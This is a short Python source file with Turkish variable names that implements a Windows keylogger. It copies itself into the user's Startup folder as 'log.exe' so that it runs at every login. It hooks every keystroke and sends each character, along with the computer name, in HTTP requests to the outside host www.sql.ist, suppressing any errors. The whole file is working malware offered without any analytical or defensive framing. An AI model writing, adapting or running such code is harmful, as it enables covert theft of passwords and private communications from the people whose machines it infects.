import pyHook, pythoncom, os, httplib, urllib, getpass, shutil, sys

kullaniciAdi = getpass.getuser()
dosyaYolu = 'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\' %kullaniciAdi

if os.path.exists(dosyaYolu):
    
    if os.path.isfile(dosyaYolu + 'log.exe') == False:
        try:
            shutil.copy2(sys.argv[0], dosyaYolu + 'log.exe')
        except:
            pass

def klavye_kayit(event):
    try:
        parametreler = urllib.urlencode({'pcName': os.environ['COMPUTERNAME'], 'toLog': chr(event.Ascii)})
        baglanti = httplib.HTTPConnection("www.sql.ist")
        baglanti.request("GET", "/index.php?" + parametreler)
        baglanti.close()
    except:
        pass
    return True

hook_manager = pyHook.HookManager()
hook_manager.KeyDown = klavye_kayit
hook_manager.HookKeyboard()
pythoncom.PumpMessages()

